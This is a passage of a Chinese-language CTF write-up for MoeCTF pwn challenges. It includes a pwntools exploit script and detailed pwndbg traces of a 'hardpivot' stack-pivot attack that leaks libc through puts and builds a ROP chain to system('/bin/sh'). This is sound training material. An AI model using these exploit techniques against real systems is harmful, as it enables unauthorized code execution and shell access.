<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">leave_pop_ret_addr=<span class="number">0x401211</span></span><br><span class="line">leave_ret_addr=<span class="number">0x40133e</span></span><br><span class="line">backdoor_addr=<span class="number">0x401230</span></span><br><span class="line">bss_addr=<span class="number">0x404060</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x401219</span></span><br><span class="line">main_addr=<span class="number">0x4011de</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Before that,you need to tell us the length of your introduction.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">0x100</span>+p64(bss_addr+<span class="number">0x200</span>)+p64(pop_rdi_addr)+p64(<span class="number">0x404078</span>)+p64(backdoor_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Now, please tell us your phone number:\n&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc</span>+p64(bss_addr+<span class="number">0x800</span>)+p64(leave_ret_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>我们先在bss段上构造我们可以利用的栈，再利用第二次输入实现栈迁移并劫持程序</p>
<p>为什么b’/bin/sh‘*0x100？调用system函数会利用很大的栈空间，所以我们需要抬高栈基地址，并不一定是b’/bin/sh’*0x100</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401334                 call    _read</span><br><span class="line">.text:0000000000401339                 mov     eax, 0</span><br><span class="line">.text:000000000040133E                 leave</span><br><span class="line">.text:000000000040133F                 retn</span><br></pre></td></tr></table></figure>
<p>下面来详细解释一下流程：</p>
<p>第二次输入完成后，leave(mov rsp,rbp；pop rbp)此时rbp变为0x404860</p>
<p>接着返回我们控制的leave；retn</p>
<p>再次进行leave，此时rsp指向0x404860+0x8(对应pop_rdi_addr），rbp指向0x404260</p>
<p>retn(pop rip)执行pop rdi，将0x404078地址的内容即是/bin/sh00弹入rdi</p>
<p>再执行0x401230 call _system即可实现劫持</p>
<p>下面是system调用需要注意的地方</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  0x7f5cd00582d0 &lt;do_system&gt;       push   r13</span><br><span class="line">  0x7f5cd00582d2 &lt;do_system+2&gt;     mov    edx, 1                              EDX =&gt; 1</span><br><span class="line">  0x7f5cd00582d7 &lt;do_system+7&gt;     push   r12</span><br><span class="line">  0x7f5cd00582d9 &lt;do_system+9&gt;     mov    r12, rdi                            R12 =&gt; 0x404078 (desc+24) ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">  0x7f5cd00582dc &lt;do_system+12&gt;    push   rbp</span><br><span class="line">► 0x7f5cd00582dd &lt;do_system+13&gt;    push   rbx</span><br><span class="line">  0x7f5cd00582de &lt;do_system+14&gt;    `sub    rsp, 0x388`                          RSP =&gt; 0x4044d0 (desc+1136) (0x404858 - 0x388)</span><br><span class="line">  0x7f5cd00582e5 &lt;do_system+21&gt;    mov    rax, qword ptr fs:[0x28]            RAX, [0x7f5cd0291768] =&gt; 0x57019af9a1b4e700</span><br><span class="line">  0x7f5cd00582ee &lt;do_system+30&gt;    mov    qword ptr [rsp + 0x378], rax        [desc+2024] &lt;= 0x57019af9a1b4e700</span><br><span class="line">  0x7f5cd00582f6 &lt;do_system+38&gt;    xor    eax, eax                            EAX =&gt; 0</span><br><span class="line">  0x7f5cd00582f8 &lt;do_system+40&gt;    mov    dword ptr [rsp + 8], 0xffffffff     [desc+1144] &lt;= 0xffffffff</span><br></pre></td></tr></table></figure>
<h3 id="hardpivot">hardpivot</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Moectf/hardpivot/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;See you again!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time I will not give you any gifts again.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aASingleStackPi);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Think back to what you learned from the previous challenges and integrate it comprehensively.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You have made it this far—keep going, victory is not far away.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401208 ; ssize_t vuln()</span><br><span class="line">.text:0000000000401208                 public vuln</span><br><span class="line">.text:0000000000401208 vuln            proc near               ; CODE XREF: main+17↓p</span><br><span class="line">.text:0000000000401208</span><br><span class="line">.text:0000000000401208 buf             = byte ptr -40h</span><br><span class="line">.text:0000000000401208</span><br><span class="line">.text:0000000000401208 ; __unwind &#123;</span><br><span class="line">.text:0000000000401208                 endbr64</span><br><span class="line">.text:000000000040120C                 push    rbp</span><br><span class="line">.text:000000000040120D                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401210                 sub     rsp, 40h</span><br><span class="line">.text:0000000000401214                 lea     rax, s          ; &quot;This time I will not give you any gifts&quot;...</span><br><span class="line">.text:000000000040121B                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040121E                 call    _puts</span><br><span class="line">.text:0000000000401223                 lea     rax, aASingleStackPi ; &quot;A single stack pivot doesn&quot;</span><br><span class="line">.text:000000000040122A                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040122D                 call    _puts</span><br><span class="line">.text:0000000000401232                 lea     rax, aThinkBackToWha ; &quot;Think back to what you learned from the&quot;...</span><br><span class="line">.text:0000000000401239                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040123C                 call    _puts</span><br><span class="line">.text:0000000000401241                 lea     rax, aYouHaveMadeItT ; &quot;You have made it this far—keep going, v&quot;...</span><br><span class="line">.text:0000000000401248                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040124B                 call    _puts</span><br><span class="line">.text:0000000000401250                 lea     rax, format     ; &quot;&gt; &quot;</span><br><span class="line">.text:0000000000401257                 mov     rdi, rax        ; format</span><br><span class="line">.text:000000000040125A                 mov     eax, 0</span><br><span class="line">.text:000000000040125F                 call    _printf</span><br><span class="line">.text:0000000000401264                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401268                 mov     edx, 50h ; &#x27;P&#x27;  ; nbytes</span><br><span class="line">.text:000000000040126D                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401270                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401275                 call    _read</span><br><span class="line">.text:000000000040127A                 nop</span><br><span class="line">.text:000000000040127B                 leave</span><br><span class="line">.text:000000000040127C                 retn</span><br><span class="line">.text:000000000040127C ; &#125; // starts at 401208</span><br><span class="line">.text:000000000040127C vuln            endp</span><br></pre></td></tr></table></figure>
<p>注意到vuln函数后面有leave;retn</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401196 ; void magic()</span><br><span class="line">.text:0000000000401196                 public magic</span><br><span class="line">.text:0000000000401196 magic           proc near</span><br><span class="line">.text:0000000000401196 ; __unwind &#123;</span><br><span class="line">.text:0000000000401196                 endbr64</span><br><span class="line">.text:000000000040119A                 push    rbp</span><br><span class="line">.text:000000000040119B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040119E                 pop     rdi</span><br><span class="line">.text:000000000040119F                 retn</span><br><span class="line">.text:000000000040119F magic           endp</span><br><span class="line">.text:000000000040119F</span><br><span class="line">.text:000000000040119F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004011A0                 db 90h</span><br><span class="line">.text:00000000004011A1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004011A1                 pop     rbp</span><br><span class="line">.text:00000000004011A2                 retn</span><br><span class="line">.text:00000000004011A2 ; &#125; // starts at 401196</span><br></pre></td></tr></table></figure>
<p>缓冲区只溢出两个8字节并且没有后门，应该是要栈迁移</p>
<p>我们的思路是：</p>
<p>第一次进行栈迁移，并且使程序重新执行read读取我们构造的攻击载荷到新栈上</p>
<p>要进行system需要知道地址，即需要libc基址，所以我们需要在攻击载荷中将某个函数的真实地址作为参数传给输出函数，并且控制程序重新执行</p>
<p>第三次将最终的攻击载荷写到新栈上，并控制程序执行</p>
<p>下面我们来一步一步的观察一下进程</p>
<ol type="1">
<li>第一次read前</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x7fff76f94a80 —▸ 0x7fff76f94a90 ◂— 1</span><br><span class="line"> RSP  0x7fff76f94a40 —▸ 0x7b3a0be1b6a0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">*RIP  0x401275 (vuln+109) ◂— call <span class="built_in">read</span>@plt</span><br><span class="line"></span><br><span class="line"> ► 0x401275 &lt;vuln+109&gt;    call   <span class="built_in">read</span>@plt                    &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">        fd: 0 (pipe:[82862])</span><br><span class="line">        buf: 0x7fff76f94a40 —▸ 0x7b3a0be1b6a0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">        nbytes: 0x50</span><br><span class="line"></span><br><span class="line">00:0000│ rax rsi rsp 0x7fff76f94a40 —▸ 0x7b3a0be1b6a0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">01:0008│-038         0x7fff76f94a48 —▸ 0x7b3a0bc816e5 (setvbuf+245) ◂— cmp rax, 1</span><br><span class="line">02:0010│-030         0x7fff76f94a50 ◂— 0</span><br><span class="line">03:0018│-028         0x7fff76f94a58 —▸ 0x7fff76f94a80 —▸ 0x7fff76f94a90 ◂— 1</span><br><span class="line">04:0020│-020         0x7fff76f94a60 —▸ 0x7fff76f94ba8 —▸ 0x7fff76f969e6 ◂— <span class="string">&#x27;/home/ubuntu/Moectf/hardpivot/pwn_patched&#x27;</span></span><br><span class="line">05:0028│-018         0x7fff76f94a68 —▸ 0x40127d (main) ◂— endbr64</span><br><span class="line">06:0030│-010         0x7fff76f94a70 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">07:0038│-008         0x7fff76f94a78 —▸ 0x401205 (setup+98) ◂— nop</span><br><span class="line">08:0040│ rbp         0x7fff76f94a80 —▸ 0x7fff76f94a90 ◂— 1</span><br><span class="line">09:0048│+008         0x7fff76f94a88 —▸ 0x401299 (main+28) ◂— lea rax, [rip + 0xe84]</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>第一次read后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x7fff76f94a80 —▸ 0x404880 (bss_buffer+2016) ◂— 0</span><br><span class="line"> RSP  0x7fff76f94a40 ◂— 0x6161616161616161 (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">*RIP  0x40127b (vuln+115) ◂— leave</span><br><span class="line"></span><br><span class="line"> ► 0x40127b &lt;vuln+115&gt;    leave</span><br><span class="line"> </span><br><span class="line">00:0000│ rsi rsp 0x7fff76f94a40 ◂— 0x6161616161616161 (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">... ↓            7 skipped</span><br><span class="line">08:0040│ rbp     0x7fff76f94a80 —▸ 0x404880 (bss_buffer+2016) ◂— 0</span><br><span class="line">09:0048│+008     0x7fff76f94a88 —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li>第一次leave后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*RBP  0x404880 (bss_buffer+2016) ◂— 0</span><br><span class="line">*RSP  0x7fff76f94a88 —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br><span class="line">*RIP  0x40127c (vuln+116) ◂— ret</span><br><span class="line"></span><br><span class="line"> ► 0x40127c &lt;vuln+116&gt;    ret                                &lt;vuln+92&gt;</span><br><span class="line"> </span><br><span class="line"> 00:0000│ rsp 0x7fff76f94a88 —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br></pre></td></tr></table></figure>
<ol start="4" type="1">
<li>第一次retn后，第二次read前</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404880 (bss_buffer+2016) ◂— 0</span><br><span class="line">*RSP  0x7fff76f94a90 ◂— 1</span><br><span class="line">*RIP  0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br><span class="line"></span><br><span class="line"> ► 0x401264 &lt;vuln+92&gt;     lea    rax, [rbp - 0x40]     RAX =&gt; 0x404840 (bss_buffer+1952) ◂— 0</span><br><span class="line"> </span><br><span class="line">00:0000│ rsp 0x7fff76f94a90 ◂— 1</span><br><span class="line">01:0008│     0x7fff76f94a98 —▸ 0x7b3a0bc29d90 ◂— mov edi, eax</span><br><span class="line">02:0010│     0x7fff76f94aa0 ◂— 0</span><br><span class="line">03:0018│     0x7fff76f94aa8 —▸ 0x40127d (main) ◂— endbr64</span><br><span class="line">04:0020│     0x7fff76f94ab0 ◂— 0x176f94b90</span><br><span class="line">05:0028│     0x7fff76f94ab8 —▸ 0x7fff76f94ba8 —▸ 0x7fff76f969e6 ◂— <span class="string">&#x27;/home/ubuntu/Moectf/hardpivot/pwn_patched&#x27;</span></span><br><span class="line">06:0030│     0x7fff76f94ac0 ◂— 0</span><br><span class="line">07:0038│     0x7fff76f94ac8 ◂— 0x5292586019285d4d</span><br></pre></td></tr></table></figure>
<ol start="5" type="1">
<li>第二次read后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line"> RSP  0x7fff76f94a90 ◂— 1</span><br><span class="line">*RIP  0x40127b (vuln+115) ◂— leave</span><br><span class="line"></span><br><span class="line"> ► 0x40127b &lt;vuln+115&gt;    leave</span><br><span class="line"> </span><br><span class="line"> 00:0000│ rsp 0x7fff76f94a90 ◂— 1</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; tele 0x404840</span><br><span class="line">00:0000│ rsi 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">01:0008│-038 0x404848 (bss_buffer+1960) —▸ 0x40119e (magic+8) ◂— pop rdi</span><br><span class="line">02:0010│-030 0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr64</span><br><span class="line">03:0018│-028 0x404858 (bss_buffer+1976) —▸ 0x401070 (puts@plt) ◂— endbr64</span><br><span class="line">04:0020│-020 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br><span class="line">05:0028│-018 0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">08:0040│ rbp 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">09:0048│+008 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="6" type="1">
<li>第二次leave后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*RBP  0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">*RSP  0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br><span class="line">*RIP  0x40127c (vuln+116) ◂— ret</span><br><span class="line"></span><br><span class="line"> ► 0x40127c &lt;vuln+116&gt;    ret</span><br><span class="line"> </span><br><span class="line"> 00:0000│ rsp 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="7" type="1">
<li>第二次retn后，第二次ret返回的是我们控制的leave</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">*RSP  0x404890 (bss_buffer+2032) ◂— 0</span><br><span class="line">*RIP  0x40127b (vuln+115) ◂— leave</span><br><span class="line"></span><br><span class="line"> ► 0x40127b &lt;vuln+115&gt;      leave</span><br><span class="line"> </span><br><span class="line"> 00:0000│ rsp 0x404890 (bss_buffer+2032) ◂— 0</span><br><span class="line">... ↓        7 skipped</span><br></pre></td></tr></table></figure>
<ol start="8" type="1">
<li>控制执行leave后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*RBP  0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">*RSP  0x404848 (bss_buffer+1960) —▸ 0x40119e (magic+8) ◂— pop rdi</span><br><span class="line">*RIP  0x40127c (vuln+116) ◂— ret</span><br><span class="line"></span><br><span class="line"> ► 0x40127c       &lt;vuln+116&gt;      ret</span><br><span class="line"> </span><br><span class="line">00:0000│ rsp 0x404848 (bss_buffer+1960) —▸ 0x40119e (magic+8) ◂— pop rdi</span><br><span class="line">01:0008│+0d0 0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr64</span><br><span class="line">02:0010│+0d8 0x404858 (bss_buffer+1976) —▸ 0x401070 (puts@plt) ◂— endbr64</span><br><span class="line">03:0018│+0e0 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br><span class="line">04:0020│+0e8 0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">07:0038│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">08:0040│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="9" type="1">
<li>控制执行ret后，即将执行put</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">*RSP  0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr64</span><br><span class="line">*RIP  0x40119e (magic+8) ◂— pop rdi</span><br><span class="line"></span><br><span class="line"> ► 0x40119e       &lt;magic+8&gt;       pop    rdi     RDI =&gt; 0x404018 (puts@got[plt])</span><br><span class="line">   0x40119f       &lt;magic+9&gt;       ret                                &lt;puts@plt&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x401070       &lt;puts@plt&gt;      endbr64</span><br><span class="line">   0x401074       &lt;puts@plt+4&gt;    bnd jmp qword ptr [rip + 0x2f9d]   &lt;puts&gt;</span><br><span class="line">   </span><br><span class="line">00:0000│ rsp 0x404850 (bss_buffer+1968) —▸ 0x404018 (puts@got[plt]) —▸ 0x7b3a0bc80e50 (puts) ◂— endbr64</span><br><span class="line">01:0008│+0d8 0x404858 (bss_buffer+1976) —▸ 0x401070 (puts@plt) ◂— endbr64</span><br><span class="line">02:0010│+0e0 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br><span class="line">03:0018│+0e8 0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">06:0030│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">07:0038│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="10" type="1">
<li>put结束前</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">*RSP  0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br><span class="line">*RIP  0x7b3a0bc80f82 (puts+306) ◂— ret</span><br><span class="line"></span><br><span class="line"> ► 0x7b3a0bc80f82 &lt;puts+306&gt;    ret                                &lt;vuln+92&gt;</span><br><span class="line"> </span><br><span class="line">00:0000│ rsp 0x404860 (bss_buffer+1984) —▸ 0x401264 (vuln+92) ◂— lea rax, [rbp - 0x40]</span><br><span class="line">01:0008│+0e8 0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">04:0020│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">05:0028│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="11" type="1">
<li>第三次read前</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line"> RSP  0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">*RIP  0x401275 (vuln+109) ◂— call <span class="built_in">read</span>@plt</span><br><span class="line"></span><br><span class="line"> ► 0x401275       &lt;vuln+109&gt;    call   <span class="built_in">read</span>@plt                    &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">        fd: 0 (pipe:[82862])</span><br><span class="line">        buf: 0x404740 (bss_buffer+1696) ◂— 0</span><br><span class="line">        nbytes: 0x50</span><br><span class="line"></span><br><span class="line">00:0000│ rsp 0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">03:0018│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) ◂— 0</span><br><span class="line">04:0020│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="12" type="1">
<li>第三次read结束后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line"> RSP  0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">*RIP  0x40127b (vuln+115) ◂— leave</span><br><span class="line"></span><br><span class="line"> ► 0x40127b &lt;vuln+115&gt;    leave</span><br><span class="line"> </span><br><span class="line">00:0000│ rsp 0x404868 (bss_buffer+1992) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">03:0018│+100 0x404880 (bss_buffer+2016) —▸ 0x404840 (bss_buffer+1952) —▸ 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— ...</span><br><span class="line">04:0020│+108 0x404888 (bss_buffer+2024) —▸ 0x40127b (vuln+115) ◂— leave</span><br><span class="line"></span><br><span class="line">00:0000│ rsi 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">01:0008│-038 0x404748 (bss_buffer+1704) —▸ 0x40119f (magic+9) ◂— ret</span><br><span class="line">02:0010│-030 0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi</span><br><span class="line">03:0018│-028 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">04:0020│-020 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr64</span><br><span class="line">05:0028│-018 0x404768 (bss_buffer+1736) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">08:0040│ rbp 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">09:0048│+008 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="13" type="1">
<li>第三次leave后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*RBP  0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">*RSP  0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave</span><br><span class="line">*RIP  0x40127c (vuln+116) ◂— ret</span><br><span class="line"></span><br><span class="line"> ► 0x40127c &lt;vuln+116&gt;    ret                                &lt;vuln+115&gt;</span><br><span class="line">     ↓</span><br><span class="line">   0x40127b &lt;vuln+115&gt;    leave</span><br><span class="line">   0x40127c &lt;vuln+116&gt;    ret                                &lt;vuln+115&gt;</span><br><span class="line"> </span><br><span class="line">00:0000│ rsp 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="14" type="1">
<li>第三次ret后，第三次ret返回的也是我们控制的leave</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">*RSP  0x404790 (bss_buffer+1776) —▸ 0x7b3a0bc8aeed (_IO_file_write+45) ◂— <span class="built_in">test</span> rax, rax</span><br><span class="line">*RIP  0x40127b (vuln+115) ◂— leave</span><br><span class="line"></span><br><span class="line"> ► 0x40127b       &lt;vuln+115&gt;    leave</span><br><span class="line">   0x40127c       &lt;vuln+116&gt;    ret                                &lt;magic+9&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40119f       &lt;magic+9&gt;     ret                                &lt;magic+8&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40119e       &lt;magic+8&gt;     pop    rdi     RDI =&gt; 0x7b3a0bdd8678</span><br><span class="line">   0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;</span><br><span class="line"></span><br><span class="line">00:0000│ rsp 0x404790 (bss_buffer+1776) —▸ 0x7b3a0bc8aeed (_IO_file_write+45) ◂— <span class="built_in">test</span> rax, rax</span><br></pre></td></tr></table></figure>
<ol start="15" type="1">
<li>控制执行的leave后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*RBP  0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">*RSP  0x404748 (bss_buffer+1704) —▸ 0x40119f (magic+9) ◂— ret</span><br><span class="line">*RIP  0x40127c (vuln+116) ◂— ret</span><br><span class="line"></span><br><span class="line"> ► 0x40127c       &lt;vuln+116&gt;    ret                                &lt;magic+9&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40119f       &lt;magic+9&gt;     ret                                &lt;magic+8&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40119e       &lt;magic+8&gt;     pop    rdi     RDI =&gt; 0x7b3a0bdd8678</span><br><span class="line">   0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;</span><br><span class="line"></span><br><span class="line">00:0000│ rsp 0x404748 (bss_buffer+1704) —▸ 0x40119f (magic+9) ◂— ret</span><br><span class="line">01:0008│+0d0 0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi</span><br><span class="line">02:0010│+0d8 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">03:0018│+0e0 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr64</span><br><span class="line">04:0020│+0e8 0x404768 (bss_buffer+1736) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">07:0038│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">08:0040│+108 